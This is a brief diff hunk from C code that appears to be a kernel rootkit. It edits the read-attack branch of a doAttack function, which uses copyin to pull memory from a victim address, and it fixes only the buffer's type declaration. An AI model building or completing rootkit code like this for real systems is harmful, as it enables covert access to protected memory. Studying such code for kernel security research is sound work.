@@ -164,7 +164,7 @@ doAttack (struct thread * td) {
     // Direct read attack
     case at_read: {
       printf ("Rootkit: doAttack: Read Attack\n");
-      static buffer[SIZE];
+      static char buffer[4096];
       ret = copyin (victimAddr, buffer, victimLen); 
       if (ret == EFAULT) {
         printf ("Rootkit: EFAULT at %lx\n", victimAddr);
